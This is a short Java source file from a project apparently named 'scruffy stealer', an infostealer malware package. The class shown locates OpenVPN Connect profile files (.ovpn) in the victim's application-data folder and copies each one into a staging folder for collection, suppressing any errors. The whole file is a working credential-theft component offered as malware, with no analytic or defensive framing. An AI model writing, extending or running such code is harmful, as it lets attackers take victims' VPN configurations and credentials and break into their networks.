package scruffy.stealer.impl.vpn;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.utils.utilities;

public class open_vpn extends utilities {

    public void initialize() throws Exception {
        Files.list(Paths.get(System.getenv("appdata"), "/OpenVPN Connect/profiles")).filter(name -> name.toString().endsWith(".ovpn"))
        	.forEach(file -> {
	            try {
	                FileUtils.copyFile(file.toFile(), new File(String.format("%s/vpn/open/%s", getFolder(), file.getFileName())));
					content.add("open_vpn");
	            } catch (Exception ignored) {}
	        });
    }
    
}